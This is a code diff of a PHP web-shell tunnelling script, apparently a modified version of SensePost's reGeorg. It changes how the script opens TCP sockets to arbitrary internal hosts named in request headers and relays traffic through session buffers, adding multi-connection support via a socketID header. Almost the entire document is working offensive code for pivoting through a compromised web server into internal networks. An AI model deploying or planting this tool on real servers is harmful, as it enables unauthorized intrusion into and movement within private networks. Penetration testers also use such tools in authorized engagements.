@@ -1,12 +1,12 @@
 <?php
-/*                   _____
-   ____   ______  __|___  |__  ______  _____  _____   ______
- |     | |   ___||   ___|    ||   ___|/     \|     | |   ___|
- |     \ |   ___||   |  |    ||   ___||     ||     \ |   |  |
- |__|\__\|______||______|  __||______|\_____/|__|\__\|______|
+/*                   _____                                    
+   ____   ______  __|___  |__  ______  _____  _____   ______  
+ |     | |   ___||   ___|    ||   ___|/     \|     | |   ___| 
+ |     \ |   ___||   |  |    ||   ___||     ||     \ |   |  | 
+ |__|\__\|______||______|  __||______|\_____/|__|\__\|______| 
                     |_____|
                     ... every office needs a tool like Georg
-
+                    
   willem@sensepost.com / @_w_m__
   sam@sensepost.com / @trowalts
   etienne@sensepost.com / @kamp_staaldraad
@@ -27,7 +27,6 @@ https://github.com/sensepost/reGeorg
 
 ini_set("allow_url_fopen", true);
 ini_set("allow_url_include", true);
-error_reporting(E_ERROR | E_PARSE);
 
 if( !function_exists('apache_request_headers') ) {
     function apache_request_headers() {
@@ -66,28 +65,26 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 			{
 				$target = $headers["X-TARGET"];
 				$port = (int)$headers["X-PORT"];
-				#$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
-				#if ($sock === false)
-				#{
-				#	header('X-STATUS: FAIL');
-				#	header('X-ERROR: Failed creating socket');
-				#	return;
-				#}
-        $res = fsockopen($target, $port);
-				#$res = @socket_connect($sock, $target, $port);
-                if ($res === false)
-				{
+				$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+				if ($sock === false) 
+				{	
+					header('X-STATUS: FAIL');
+					header('X-ERROR: Failed creating socket');
+					return;
+				}
+				$res = @socket_connect($sock, $target, $port);
+                if ($res === false) 
+				{ 
 					header('X-STATUS: FAIL');
 					header('X-ERROR: Failed connecting to target');
 					return;
 				}
-				#socket_set_nonblock($res);
-
-        stream_set_blocking($res, false);
+				socket_set_nonblock($sock);	
 				@session_start();
-				$_SESSION["run"] = true;
-                $_SESSION["writebuf"] = "";
-                $_SESSION["readbuf"] = "";
+                $socketID = isset($headers["socketID"])?$headers["socketID"]:"";
+				$_SESSION[$socketID."run"] = true;
+                $_SESSION[$socketID."writebuf"] = "";
+                $_SESSION[$socketID."readbuf"] = "";
                 ob_end_clean();
                 header('X-STATUS: OK');
                 header("Connection: close");
@@ -96,36 +93,34 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 $size = ob_get_length();
                 header("Content-Length: $size");
                 ob_end_flush();
-                flush();
+                flush();            
 				session_write_close();
 
-				while ($_SESSION["run"])
+	            $bufSize = $headers["Bufsize"];
+				while ($_SESSION[$socketID."run"])
 				{
 					$readBuff = "";
 					@session_start();
-					$writeBuff = $_SESSION["writebuf"];
-					$_SESSION["writebuf"] = "";
+					$writeBuff = $_SESSION[$socketID."writebuf"];
+					$_SESSION[$socketID."writebuf"] = "";
 					session_write_close();
                     if ($writeBuff != "")
 					{
-            stream_set_blocking($res, false);
-						$i = fwrite($res, $writeBuff); #socket_write($sock, $writeBuff, strlen($writeBuff));
+						$i = socket_write($sock, $writeBuff, strlen($writeBuff));
 						if($i === false)
-						{
+						{ 
 							@session_start();
-                            $_SESSION["run"] = false;
+                            $_SESSION[$socketID."run"] = false;
                             session_write_close();
                             header('X-STATUS: FAIL');
 							header('X-ERROR: Failed writing socket');
 						}
 					}
-          # stream_set_timeout($res, 1);
-          stream_set_blocking($res, false);
-          while ($o = fgets($res, 10)) {
+					while ($o = socket_read($sock, $bufSize)) {
 					if($o === false)
-						{
+						{ 
                             @session_start();
-                            $_SESSION["run"] = false;
+                            $_SESSION[$socketID."run"] = false;
                             session_write_close();
 							header('X-STATUS: FAIL');
 							header('X-ERROR: Failed reading from socket');
@@ -134,19 +129,27 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 					}
                     if ($readBuff!=""){
                         @session_start();
-                        $_SESSION["readbuf"] .= $readBuff;
+                        $_SESSION[$socketID."readbuf"] .= $readBuff;
                         session_write_close();
                     }
                     #sleep(0.2);
 				}
-                fclose($res);
+                socket_close($sock);
 			}
 			break;
 		case "DISCONNECT":
 			{
                 error_log("DISCONNECT recieved");
 				@session_start();
-				$_SESSION["run"] = false;
+                if(isset($headers["socketID"]))
+                {
+                    $_SESSION[$headers["socketID"]."run"] = false;
+                    unset($_SESSION[$headers["socketID"]."run"]);
+                    unset($_SESSION[$headers["socketID"]."writebuf"]);
+                    unset($_SESSION[$headers["socketID"]."readbuf"]);
+                }
+                else
+                    $_SESSION["run"] = false;
 				session_write_close();
 				return;
 			}
@@ -154,9 +157,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 		case "READ":
 			{
 				@session_start();
-				$readBuffer = $_SESSION["readbuf"];
-                $_SESSION["readbuf"]="";
-                $running = $_SESSION["run"];
+                $socketID = isset($headers["socketID"])?$headers["socketID"]:"";
+				$readBuffer = $_SESSION[$socketID."readbuf"];
+                $_SESSION[$socketID."readbuf"]="";
+                $running = $_SESSION[$socketID."run"];
 				session_write_close();
                 if ($running) {
 					header('X-STATUS: OK');
@@ -173,7 +177,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 		case "FORWARD":
 			{
                 @session_start();
-                $running = $_SESSION["run"];
+                $socketID = isset($headers["socketID"])?$headers["socketID"]:"";
+                $running = $_SESSION[$socketID."run"];
 				session_write_close();
                 if(!$running){
                     header('X-STATUS: FAIL');
@@ -184,7 +189,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 				$rawPostData = file_get_contents("php://input");
 				if ($rawPostData) {
 					@session_start();
-					$_SESSION["writebuf"] .= $rawPostData;
+					$_SESSION[$socketID."writebuf"] .= $rawPostData;
 					session_write_close();
 					header('X-STATUS: OK');
                     header("Connection: Keep-Alive");
